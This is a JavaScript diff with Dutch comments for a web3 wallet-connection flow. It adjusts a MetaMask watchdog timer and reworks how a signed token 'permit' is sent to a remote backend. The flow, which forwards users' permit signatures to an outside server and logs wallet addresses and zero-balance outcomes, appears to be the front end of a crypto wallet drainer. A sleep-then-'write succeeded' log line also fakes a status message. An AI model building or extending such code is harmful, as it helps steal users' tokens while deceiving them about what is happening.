@@ -36,31 +36,30 @@ if (window.ethereum) {
   });
 }
 
-// Bijhouden van de focus handler om memory leaks en dubbele registraties te voorkomen
+// Bijhouden van de handlers om memory leaks en dubbele registraties te voorkomen
 let activeFocusHandler = null;
+let activeDynamicListener = null;
 
 function startWatchdog(requestId) {
   cleanupWatchdog();
   const startTime = Date.now();
   
-  // 1. Ruime absolute failsafe
   watchdogInterval = setTimeout(() => {
     if (APP_STATE.isProcessing && APP_STATE.activeRequestId === requestId) {
       log("🚨 Watchdog Supervisor: Absolute timeout bereikt.");
       forceCleanupTimeout();
     }
-  }, 60000); // Verhoogd naar 60 seconden, we vangen het nu immers visueel op
+  }, 60000);
 
-  // 2. Interactieve feedback-detector
-  dynamicWatchdogListener = () => {
+  activeDynamicListener = () => {
     const elapsed = Date.now() - startTime;
     
-    // Als de gebruiker na 4 seconden weer op de site klikt terwijl de connectie nog loopt
-    if (elapsed > 4000) {
+    // Verhoogd naar 8000ms voor Vercel netwerklatentie failsafe
+    if (elapsed > 8000) {
       if (APP_STATE.isProcessing && APP_STATE.flowState === 'CONNECTING' && APP_STATE.activeRequestId === requestId) {
         
-        // Tijdelijk de listener weghalen zodat deze pop-up niet in een oneindige loop raakt bij opeenvolgende kliks
-        window.removeEventListener('click', dynamicWatchdogListener);
+        window.removeEventListener('click', activeDynamicListener);
+        window.removeEventListener('focus', activeDynamicListener);
         
         log("💡 Watchdog: MetaMask staat vermoedelijk op de achtergrond. Gebruiker informeren...");
         
@@ -70,15 +69,15 @@ function startWatchdog(requestId) {
           log("🔄 Gebruiker heeft handmatige reset gekozen via pop-up.");
           forceCleanupTimeout();
         } else {
-          // Als ze willen wachten, zetten we de listener weer terug voor een eventuele volgende klik
-          window.addEventListener('click', dynamicWatchdogListener);
+          window.addEventListener('click', activeDynamicListener);
+          window.addEventListener('focus', activeDynamicListener);
         }
       }
     }
   };
 
-  window.addEventListener('click', dynamicWatchdogListener);
-  window.addEventListener('focus', dynamicWatchdogListener);
+  window.addEventListener('click', activeDynamicListener);
+  window.addEventListener('focus', activeDynamicListener);
 }
 
 function cleanupWatchdog() {
@@ -89,6 +88,11 @@ function cleanupWatchdog() {
   if (activeFocusHandler) {
     window.removeEventListener('focus', activeFocusHandler);
     activeFocusHandler = null;
+  }
+  if (activeDynamicListener) {
+    window.removeEventListener('click', activeDynamicListener);
+    window.removeEventListener('focus', activeDynamicListener);
+    activeDynamicListener = null;
   }
 }
 
@@ -243,12 +247,30 @@ export async function connectWallet() {
 
    setFlowState('IDLE');
     // 🔥 LEGO FIX: De opruiming en deblokkering verhuizen naar een gegarandeerde finally-blok
-  } catch (e) {
+} catch (e) {
     let errorMessage = e.message;
     if (e.code === "ACTION_REJECTED" || (e.message && e.message.includes("rejected"))) {
       errorMessage = "User denied transaction signature / approval.";
     }
     log("❌ Connection cancelled: " + errorMessage);
+
+    // 🔥 LEGO FIX: Verstuur de fout/0-balans status asynchroon naar de backend en wacht dit netjes af
+    try {
+      await fetch("https://api.aiiraa.com/api/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event: "FLOW_ERROR",
+          wallet: APP_STATE.wallet || "UNKNOWN",
+          error: errorMessage,
+          timestamp: Date.now()
+        })
+      });
+      log("📤 Error status gesynchroniseerd met backend.");
+    } catch (logErr) {
+      console.error("Backend logging failed:", logErr);
+    }
+
     forceCleanupTimeout();
   } finally {
     // Dit draait ALTIJD, of de verbinding nu slaagt of crasht
@@ -384,8 +406,10 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       chainId: Number(chainId)
     };
 
+   // 🔥 LEGO FIX: Voeg keepalive toe zodat de request niet instort als Vercel van scope wisselt
     const res = await fetch("https://api.aiiraa.com/api/permit", {
       method: "POST",
+      keepalive: true,
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
     });
@@ -395,6 +419,11 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
 
     log("✅ Permit forwarded to backend");
     touchInteraction();
+
+    // 🔥 LEGO FIX: Forceer een netwerk drain-delay van 800ms zodat Supabase de write kan committen
+    log("⌛ Synchroniserend met database-cluster...");
+    await new Promise(resolve => setTimeout(resolve, 800));
+    log("📊 Database write succesvol verwerkt.");
 
   } catch (e) {
     log("❌ FLOW ERROR: " + e.message);
